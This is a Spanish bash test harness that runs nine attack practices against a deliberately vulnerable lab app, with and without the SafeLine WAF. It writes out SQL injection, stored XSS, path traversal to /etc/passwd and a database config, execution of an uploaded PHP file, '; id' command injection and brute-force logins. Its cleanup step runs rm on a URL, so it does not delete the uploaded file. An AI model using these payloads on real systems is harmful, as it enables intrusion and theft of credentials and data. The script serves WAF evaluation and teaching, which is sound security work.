#!/usr/bin/env bash
#
# lab_matrix.sh - Matriz completa de pruebas del laboratorio SIGI
#
# Ejecuta las nueve practicas contra un origen de destino. Se usa dos veces
# en la demostracion: una contra Apache directo (Escenario A) y otra contra
# SafeLine (Escenario B). El script es identico en ambos casos: solo cambia
# la bandera --waf, que invierte la expectativa de las pruebas de ataque.
#
# USO
#   ./lab_matrix.sh [URL_BASE] [--waf] [-v] [-p]
#
#   URL_BASE   Por defecto http://localhost/fa/sistemas
#   --waf      Escenario B: se espera que SafeLine detenga los ataques de
#              payload. Las pruebas de autorizacion (LAB-03) y de credencial
#              (LAB-08) se evaluan aparte porque ningun WAF las detiene.
#   -v         Muestra el detalle de cada solicitud.
#   -p         Conserva los artefactos que crean las pruebas (por defecto se
#              limpian al terminar).
#
# EJEMPLOS
#   ./lab_matrix.sh
#   ./lab_matrix.sh http://192.168.100.22:8000/fa/sistemas --waf -v
#
# SALIDA
#   Codigo 0 si el escenario se cumple completo, 1 si algo se comporto de
#   forma inesperada.
#
# -----------------------------------------------------------------------------

set -u

BASE_URL="http://localhost/fa/sistemas"
MODO_WAF=0
VERBOSE=0
CONSERVAR=0

TOTAL=0
OK=0
MAL=0

# Clasificacion de cada hallazgo
DETENIDO_WAF=0      # el WAF lo detiene
NO_CUBIERTO=0       # ningun WAF lo detiene: defecto de la aplicacion

C_ADMIN="admin"
C_PASS="Admin_2026!"
C_CONSULTA="consulta"
C_CONSULTA_PASS="Consulta_2026!"

# -----------------------------------------------------------------------------
# Argumentos
# -----------------------------------------------------------------------------
for arg in "$@"; do
    case "$arg" in
        --waf)     MODO_WAF=1 ;;
        -v|--verbose) VERBOSE=1 ;;
        -p|--preserve) CONSERVAR=1 ;;
        -h|--help) sed -n '2,30p' "$0"; exit 0 ;;
        http*)     BASE_URL="${arg%/}" ;;
        *) echo "Argumento desconocido: $arg" >&2; exit 2 ;;
    esac
done

JAR_ADM=$(mktemp)
JAR_CON=$(mktemp)
SALIDA=$(mktemp)
trap 'rm -f "$JAR_ADM" "$JAR_CON" "$SALIDA"' EXIT

# -----------------------------------------------------------------------------
# Presentacion
# -----------------------------------------------------------------------------
if [ "$MODO_WAF" -eq 1 ]; then
    ETIQUETA="Escenario B - detras de SafeLine"
    ESPERA="bloqueada"
else
    ETIQUETA="Escenario A - Apache directo"
    ESPERA="exitosa"
fi

echo "=============================================================================="
echo " SIGI - Matriz de laboratorio"
echo " $ETIQUETA"
echo " Destino: $BASE_URL"
echo " Ataques de payload esperados: $ESPERA"
echo " Fecha:   $(date '+%Y-%m-%d %H:%M:%S')"
echo "=============================================================================="
echo

# -----------------------------------------------------------------------------
# Utilidades
# -----------------------------------------------------------------------------

# result <OK|BLOQ|FALLO> <etiqueta> <detalle>
result() {
    TOTAL=$((TOTAL + 1))
    case "$1" in
        OK)    OK=$((OK + 1))    ;;
        BLOQ)  OK=$((OK + 1))    DETENIDO_WAF=$((DETENIDO_WAF + 1)) ;;
        FALLO) MAL=$((MAL + 1))  ;;
    esac
    printf "  [ %-5s] %-44s %s\n" "$1" "$2" "$3"
}

# espera_atacar: en Escenario A el ataque debe funcionar, en B debe fallar.
espera_atacar() {
    if [ "$MODO_WAF" -eq 1 ]; then echo "BLOQ"; else echo "OK"; fi
}

login() {
    local jar="$1" usuario="$2" clave="$3"
    rm -f "$jar"
    curl -s -o /dev/null -c "$jar" -b "$jar" \
         --data-urlencode "username=$usuario" \
         --data-urlencode "password=$clave" \
         "$BASE_URL/login.php"
}

verbose() { [ "$VERBOSE" -eq 1 ] && echo "           $1"; return 0; }

# -----------------------------------------------------------------------------
# Sesion
# -----------------------------------------------------------------------------
echo "-- Sesion -------------------------------------------------------------"
login "$JAR_ADM" "$C_ADMIN" "$C_PASS"
if curl -s -b "$JAR_ADM" "$BASE_URL/dashboard.php" | grep -q "Bienvenido"; then
    result OK "autenticacion como administrador" "sesion iniciada"
else
    result FALLO "autenticacion como administrador" "no se pudo iniciar sesion"
    echo
    echo " Abortando: sin sesion no se pueden ejecutar las practicas."
    exit 1
fi
login "$JAR_CON" "$C_CONSULTA" "$C_CONSULTA_PASS"
if curl -s -b "$JAR_CON" "$BASE_URL/employees/index.php" | grep -q "Directorio"; then
    result OK "autenticacion como rol consulta" "sesion iniciada"
else
    result FALLO "autenticacion como rol consulta" "no se pudo iniciar sesion"
fi
echo

# -----------------------------------------------------------------------------
# LAB-01 - Inyeccion SQL en el acceso
# -----------------------------------------------------------------------------
echo "-- LAB-01  SQL Injection en autenticacion ----------------------------"
for payload in "admin' -- " "' OR '1'='1' -- " "' OR 1=1#"; do
    login "$JAR_ADM" "$payload" "loquesea"
    if curl -s -b "$JAR_ADM" "$BASE_URL/dashboard.php" | grep -q "Bienvenido"; then
       _details="entro al panel"
        details="entro al panel"
        espera=$(espera_atacar)
        if [ "$espera" = "OK" ]; then
            result OK "payload [$payload]" "$details"
        else
            result FALLO "payload [$payload]" "$details - debia estar bloqueada"
        fi
    else
        details="rechazado"
        if [ "$MODO_WAF" -eq 1 ]; then
            result BLOQ "payload [$payload]" "$details"
        else
            result FALLO "payload [$payload]" "$details - debia funcionar"
        fi
    fi
    login "$JAR_ADM" "$C_ADMIN" "$C_PASS" >/dev/null
done
echo

# -----------------------------------------------------------------------------
# LAB-02 - Inyeccion SQL en la busqueda de equipos
# -----------------------------------------------------------------------------
echo "-- LAB-02  SQL Injection en busqueda de equipos -----------------------"

# 2.1 tautologia: debe devolver el inventario completo
N=$(curl -s -b "$JAR_ADM" --get --data-urlencode "q=' OR '1'='1" \
      "$BASE_URL/equipment/search.php" \
    | grep -oE 'Se encontraron <strong>[0-9]+</strong>' | grep -oE '[0-9]+' | head -1)
N=${N:-0}
verbose "equipos devueltos por la tautologia: $N"
if [ "$MODO_WAF" -eq 0 ] && [ "$N" -ge 50 ]; then
    result OK "tautologia devuelve el inventario entero" "$N equipos"
elif [ "$MODO_WAF" -eq 1 ] && [ "$N" -le 1 ]; then
    result BLOQ "tautologia devuelve el inventario entero" "$N equipos"
else
    result FALLO "tautologia devuelve el inventario entero" "$N equipos"
fi

# 2.2 injection basada en tiempo
T0=$(date +%s%N)
curl -s -o /dev/null -b "$JAR_ADM" --get \
     --data-urlencode "q=INV-000053' AND SLEEP(3) AND 'a' LIKE '" \
     "$BASE_URL/equipment/search.php"
T1=$(date +%s%N)
MS=$(( (T1 - T0) / 1000000 ))
verbose "retardo observado: ${MS} ms"
if [ "$MODO_WAF" -eq 0 ] && [ "$MS" -ge 2500 ]; then
    result OK "SLEEP(3) retrasa la respuesta" "${MS} ms"
elif [ "$MODO_WAF" -eq 1 ] && [ "$MS" -lt 2500 ]; then
    result BLOQ "SLEEP(3) retrasa la respuesta" "${MS} ms"
else
    result FALLO "SLEEP(3) retrasa la respuesta" "${MS} ms"
fi

# 2.3 error based
if curl -s -b "$JAR_ADM" --get --data-urlencode "q='" \
        "$BASE_URL/equipment/search.php" | grep -qiE "error de MySQL|MariaDB|You have an error"; then
    details="error de base de datos expuesto"
else
    details="sin error de base de datos"
fi
if [ "$MODO_WAF" -eq 0 ] && echo "$details" | grep -q "expuesto"; then
    result OK "error based revela la base de datos" "$details"
elif [ "$MODO_WAF" -eq 1 ] && echo "$details" | grep -q "sin error"; then
    result BLOQ "error based revela la base de datos" "$details"
else
    result FALLO "error based revela la base de datos" "$details"
fi
echo

# -----------------------------------------------------------------------------
# LAB-03 - IDOR en la ficha de empleado
#
# Este NO lo detiene un WAF: la peticion es una URL legitima con otro id.
# Se registra aparte para no falsear el resultado de SafeLine.
# -----------------------------------------------------------------------------
echo "-- LAB-03  IDOR en datos personales de empleados --------------------"
LEAK=0
for id in 1 11 17; do
    if curl -s -b "$JAR_CON" "$BASE_URL/employees/view.php?id=$id" \
        | grep -q 'class="badge bg-danger">Restringido'; then
        LEAK=$((LEAK + 1))
    fi
done
if [ "$LEAK" -eq 3 ]; then
    result OK "rol consulta lee fichas restringidas" "$LEAK de 3 fichas filtradas"
    NO_CUBIERTO=$((NO_CUBIERTO + 1))
    echo "           NOTA: un WAF no detiene esto. Es un defecto de la"
    echo "           aplicacion, no un ataque con payload reconocible."
else
    result FALLO "rol consulta lee fichas restringidas" "$LEAK de 3 fichas filtradas"
fi
echo

# -----------------------------------------------------------------------------
# LAB-04 - XSS almacenado en observaciones
# -----------------------------------------------------------------------------
echo "-- LAB-04  XSS almacenado en asignaciones ---------------------------"
MARK="XSSLAB04MARK"
ASIGNACION_ID=""
# La asignacion solo acepta equipos en estado Disponible, asi que el
# formulario de asignacion no debe elegir cualquiera.
EQUIPO_ID=$(curl -s -b "$JAR_ADM" --get --data-urlencode "q=" \
              --data-urlencode "estado=Disponible" \
              "$BASE_URL/equipment/search.php" \
            | grep -oE 'equipment/view\.php\?id=[0-9]+' | head -1 | grep -oE '[0-9]+')
EQUIPO_ID=${EQUIPO_ID:-0}
verbose "equipo disponible elegido: $EQUIPO_ID"
curl -s -o /dev/null -b "$JAR_ADM" \
     --data-urlencode "equipment_id=$EQUIPO_ID" \
     --data-urlencode "employee_id=1" \
     --data-urlencode "fecha_asignacion=$(date +%F)" \
     --data-urlencode "observaciones=<script>alert('$MARK')</script>" \
     "$BASE_URL/assignments/create.php"
ASIGNACION_ID=""
# Tras el alta, la asignacion creada es la mas reciente: el listado ordena
# por fecha de asignacion y, a empate, por id descendente, asi que es la
# primera fila. De ahi se toma el id para poder cerrar la prueba al final.
ASIGNACION_ID=$(curl -s -b "$JAR_ADM" "$BASE_URL/assignments/index.php" \
                   | grep -oE "assignments/return\.php\?id=[0-9]+" | head -1 | grep -oE '[0-9]+')
verbose "asignacion creada: $ASIGNACION_ID"
for pg in 1 2 3; do
    RAW=$(curl -s -b "$JAR_ADM" "$BASE_URL/assignments/index.php?page=$pg" \
          | grep -c "<script>alert('$MARK')</script>")
    [ "$RAW" -gt 0 ] && break
done
if [ "$RAW" -gt 0 ]; then
    details="script servido sin escapar (pagina $pg)"
    if [ "$MODO_WAF" -eq 0 ]; then
        result OK "payload almacenado y ejecutado" "$details"
    else
        result FALLO "payload almacenado y ejecutado" "$details - debia estar bloqueado"
    fi
else
    if [ "$MODO_WAF" -eq 1 ]; then
        result BLOQ "payload almacenado y ejecutado" "el POST fue bloqueado"
    else
        result FALLO "payload almacenado y ejecutado" "el script no llego al listado"
    fi
fi
echo

# -----------------------------------------------------------------------------
# LAB-05 - Recorrido de rutas
# -----------------------------------------------------------------------------
echo "-- LAB-05  Path Traversal en el visor de documentos -----------------"
PASSWD=$(curl -s -b "$JAR_ADM" \
    "$BASE_URL/lab/documentos.php?archivo=../../../../../../../etc/passwd" \
    | grep -c 'root:x:0:0')
CREDS=$(curl -s -b "$JAR_ADM" \
    "$BASE_URL/lab/documentos.php?archivo=../../config/db.php" \
    | grep -c 'DB_PASS')
if [ "$PASSWD" -gt 0 ] && [ "$CREDS" -gt 0 ]; then
    if [ "$MODO_WAF" -eq 0 ]; then
        result OK "lee /etc/passwd" "archivo del sistema expuesto"
    else
        result FALLO "lee /etc/passwd" "archivo del sistema expuesto - debia estar bloqueado"
    fi
else
    if [ "$MODO_WAF" -eq 1 ]; then
        result BLOQ "lee /etc/passwd" "peticion bloqueada"
    else
        result FALLO "lee /etc/passwd" "PASSWD=$PASSWD CREDS=$CREDS"
    fi
fi
echo

# -----------------------------------------------------------------------------
# LAB-06 - Subida de archivos sin restriccion
# -----------------------------------------------------------------------------
echo "-- LAB-06  Subida de archivos sin restriccion ------------------------"
echo '<?php echo "RCE-LAB06 uid=".getmyuid();' > "$SALIDA"
curl -s -o /dev/null -b "$JAR_ADM" -F "adjunto=@$SALIDA;filename=lab06prueba.php" \
     "$BASE_URL/lab/subidas.php"
RCE=$(curl -s "$BASE_URL/uploads/lab06prueba.php" | grep -c 'RCE-LAB06')
if [ "$RCE" -gt 0 ]; then
    if [ "$MODO_WAF" -eq 0 ]; then
        result OK "ejecuta un .php subido" "codigo remoto ejecutado"
    else
        result FALLO "ejecuta un .php subido" "codigo ejecutado - debia estar bloqueado"
    fi
else
    if [ "$MODO_WAF" -eq 1 ]; then
        result BLOQ "ejecuta un .php subido" "subida o ejecucion bloqueada"
    else
        result FALLO "ejecuta un .php subido" "no se pudo ejecutar"
    fi
fi
echo

# -----------------------------------------------------------------------------
# LAB-07 - Inyeccion de comandos
# -----------------------------------------------------------------------------
echo "-- LAB-07  Command Injection en diagnostico de red ------------------"
ID=$(curl -s -b "$JAR_ADM" --data-urlencode "host=; id" \
      "$BASE_URL/lab/red.php" | grep -oE 'uid=[0-9]+\([a-z0-9-]+\)' | head -1)
if [ -n "$ID" ]; then
    if [ "$MODO_WAF" -eq 0 ]; then
        result OK "ejecuta un comando del sistema" "$ID"
    else
        result FALLO "ejecuta un comando del sistema" "$ID - debia estar bloqueado"
    fi
else
    if [ "$MODO_WAF" -eq 1 ]; then
        result BLOQ "ejecuta un comando del sistema" "peticion bloqueada"
    else
        result FALLO "ejecuta un comando del sistema" "sin salida de id"
    fi
fi
echo

# -----------------------------------------------------------------------------
# LAB-08 - Credenciales debiles
#
# Tampoco lo detiene un WAF: la contrasena es correcta, el WAF no sabe
# cual es. Se reporta aparte.
# -----------------------------------------------------------------------------
echo "-- LAB-08  Credenciales debiles sin caducidad ------------------------"
if login "$JAR_CON" "$C_ADMIN" "$C_PASS" && \
   curl -s -b "$JAR_CON" "$BASE_URL/dashboard.php" | grep -q "Bienvenido"; then
    result OK "admin / Admin_2026! entra al panel" "contrasena trivial aceptada"
    NO_CUBIERTO=$((NO_CUBIERTO + 1))
    echo "           NOTA: un WAF no detiene esto. La contrasena es correcta;"
    echo "           el WAF no puede saber cual es la correcta."
else
    result FALLO "admin / Admin_2026! entra al panel" "no pudo entrar"
fi
echo

# -----------------------------------------------------------------------------
# LAB-09 - Fuerza bruta sin deteccion
# -----------------------------------------------------------------------------
echo "-- LAB-09  Fuerza bruta sin bloqueo ----------------------------------"
ANTES=$(curl -s -b "$JAR_ADM" "$BASE_URL/audit/index.php?tab=accesos&resultado=fail" \
        | grep -c "badge bg-danger")
BLOQUEADOS=0
for i in $(seq 1 12); do
    login "$JAR_CON" "$C_ADMIN" "incorrecta$i"
    if ! curl -s -b "$JAR_CON" "$BASE_URL/dashboard.php" | grep -q "Bienvenido"; then
        BLOQUEADOS=$((BLOQUEADOS + 1))
    fi
done
if [ "$BLOQUEADOS" -eq 12 ]; then
    result OK "acepta 12 intentos fallidos seguidos" "sin bloqueo de cuenta"
    NO_CUBIERTO=$((NO_CUBIERTO + 1))
    echo "           NOTA: SafeLine puede reducir el ritmo, pero no conoce"
    echo "           la contrasena correcta. En Escenario B puede cortar la"
    echo "           racha por limite de peticiones, no por credencial debil."
else
    if [ "$MODO_WAF" -eq 1 ]; then
        result BLOQ "acepta 12 intentos fallidos seguidos" "$BLOQUEADOS de 12 rechazados"
    else
        result FALLO "acepta 12 intentos fallidos seguidos" "$BLOQUEADOS de 12 rechazados"
    fi
fi
echo

# -----------------------------------------------------------------------------
# Limpieza
#
# La asignacion de LAB-04 se cierra con la propia aplicacion (return.php)
# en lugar de borrar la fila: asi el equipo vuelve a Disponible y el estado
# del inventario queda igual que antes de la prueba.
# -----------------------------------------------------------------------------
if [ "$CONSERVAR" -eq 0 ]; then
    if [ -n "$ASIGNACION_ID" ]; then
        curl -s -o /dev/null -b "$JAR_ADM" \
             --data-urlencode "fecha_devolucion=$(date +%F)" \
             --data-urlencode "nota_devolucion=cierre de prueba automatizada" \
             "$BASE_URL/assignments/return.php?id=$ASIGNACION_ID"
        echo " Asignacion $ASIGNACION_ID devuelta; el equipo quedo disponible."
    fi
    rm -f "$BASE_URL/uploads/lab06prueba.php" 2>/dev/null
fi
cat <<NOTA

 La asignacion de LAB-04 se cerro con la propia aplicacion, asi que el
 equipo quedo disponible y el inventario no sufrio cambios. La fila queda
 como historial, con el payload dentro. Para borrarla por completo:

   mysql -u<app> -p <bd> -e "DELETE FROM assignments
     WHERE observaciones LIKE '%$MARK%';"

 Para volver al estado original de la demostracion:

   mysql -u<admin> -p <bd> < database/schema.sql
   mysql -u<admin> -p <bd> < database/seed.sql

NOTA

# -----------------------------------------------------------------------------
# Resumen
# -----------------------------------------------------------------------------
echo "=============================================================================="
printf " Resultado: %d de %d pruebas con el resultado esperado" "$OK" "$TOTAL"
[ "$MAL" -gt 0 ] && printf ", %d inesperadas" "$MAL"
echo
echo
printf " Detenidos por el WAF ............ %d\n" "$DETENIDO_WAF"
printf " No cubiertos por el WAF ......... %d  (LAB-03 y LAB-08: defectos de la app)\n" "$NO_CUBIERTO"
echo
if [ "$MODO_WAF" -eq 0 ]; then
    if [ "$MAL" -eq 0 ]; then
        echo " Escenario A correcto: la aplicacion esta expuesta en todas las"
        echo " practicas. Base para la demonstracion."
    else
        echo " Escenario A INESPERADO: alguna practica no se comporto como se"
        echo " esperaba. Revisar si el WAF ya esta en el camino."
    fi
else
    if [ "$MAL" -eq 0 ]; then
        echo " Escenario B correcto: los ataques con payload quedaron bloqueados."
        echo " Los defectos de autorizacion y de credenciales siguen abiertos,"
        echo " como debe ser:ahi es donde un WAF no llega."
    else
        echo " Escenario B INESPERADO: algun ataque con payload paso el WAF."
        echo " Revisar el modo de SafeLine (se recomienda Strict) y las reglas."
    fi
fi
echo "=============================================================================="

[ "$MAL" -eq 0 ] && exit 0 || exit 1
